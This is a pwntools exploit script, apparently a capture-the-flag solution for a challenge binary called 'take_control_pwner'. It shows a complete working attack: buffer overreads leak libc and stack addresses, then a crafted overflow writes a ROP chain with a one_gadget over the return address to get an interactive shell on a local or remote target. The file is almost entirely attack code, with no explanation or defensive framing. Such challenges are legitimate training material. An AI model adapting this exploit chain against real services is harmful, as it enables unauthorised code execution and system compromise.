#!/usr/bin/env python3

from pwn import *
from subprocess import check_output
import os

exe = context.binary =  ELF("./take_control_pwner_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
context.log_level = 'debug'
gs = '''
set follow-fork-mode parent
'''

def get_pid(name):
    return int(check_output(["pidof", "-s", name]))

def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(2)
        if args.DEBUG:
            pid = get_pid("/app/take_control_pwner")
            gdb.attach(pid, gdbscript=gs)
            pause()
    elif args.REMOTE:
        p = remote(sys.argv[1], int(sys.argv[2]))

    return p

p = init()

# leak libc:
p.sendlineafter(b"client port: ", str(100))
p.sendlineafter(b"server port: ", str(100))
payload = flat(
    b"A"*(0x800-24),
)
input()
p.sendafter(b"Enter data:", payload)
p.sendlineafter(b"[y/n]\n", b"y")
input()
p.sendafter(b"Enter data:", payload)
p.recvuntil(b"Sending data: " + payload)
leak = u64(p.recvline()[:-1].ljust(8, b"\00"))
libc_base = leak - (libc.sym._IO_default_uflow+54)
og = libc_base + 0xebd3f
xor_rax = libc_base + 0x00000000000baaf9
environ = libc_base + libc.sym.environ
rbp = environ
log.info(f"leak address: {hex(leak)}") # leaking libc
log.info(f"libc base: {hex(libc_base)}")
log.info(f"environ address: {hex(environ)}")

# leak stack:

payload = flat(
    b"A"*0x708
)
p.sendlineafter(b"[y/n]\n", b"y")
p.sendafter(b"Enter data:", payload)
p.recvuntil(b"Sending data: " + payload)
leak_stack = u64(p.recvline()[:-1].ljust(8, b"\00"))
ret_addr = leak_stack - 0x20
log.info(f"leaking stack: {hex(leak_stack)}")
log.info(f"ret address: {hex(ret_addr)}")

# rop -> ret address
rop = flat(
    p64(rbp),
    p64(xor_rax),
    p64(og),
)
payload = flat(
    rop,
    b"A"*(0x800 - 24 - len(rop)),
    p64(0),
    p64(ret_addr),
)
p.sendlineafter(b"[y/n]\n", b"y")
p.sendafter(b"Enter data:", payload)

p.interactive()
